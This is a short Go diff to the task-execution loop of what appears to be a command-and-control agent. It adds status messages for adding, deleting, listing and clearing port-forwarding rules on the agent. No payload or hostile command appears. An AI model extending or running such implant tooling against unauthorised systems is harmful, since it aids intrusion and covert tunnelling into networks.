@@ -147,6 +147,8 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 				PortFwdListenerMap[len(PortFwdListenerMap)] = forwarder
 				PortFwdListenerQuitMap[len(PortFwdListenerQuitMap)] = quit
+
+				data = "added new port forwarding rule"
 			} else if strings.HasPrefix(taskData, "del") {
 				taskDataSplit := strings.Split(taskData, " / ")
 				id := taskDataSplit[1]
@@ -158,15 +160,19 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 				PortFwdListenerQuitMap[intId] <- false
 				PortFwdMap[intId] = PortFwdMap[intId] + " (killed)"
+
+				data = fmt.Sprintf("killed port forwarding rule ([%d] %s)\nthis may temporarily kill your session", intId, PortFwdMap[intId])
 			} else if strings.HasPrefix(taskData, "list") {
 				for key, value := range PortFwdMap {
 					data += fmt.Sprintf("[%d] %s\n", key, value)
 				}
 			} else if strings.HasPrefix(taskData, "clear") {
-				for key, _ := range PortFwdListenerMap {
+				for key := range PortFwdListenerMap {
 					PortFwdListenerQuitMap[key] <- false
 					PortFwdMap[key] = PortFwdMap[key] + " (killed)"
 				}
+
+				data = "killed all port forwarding rules\nthis may temporarily kill your session"
 			}
 		default:
 			data = "command not supported"
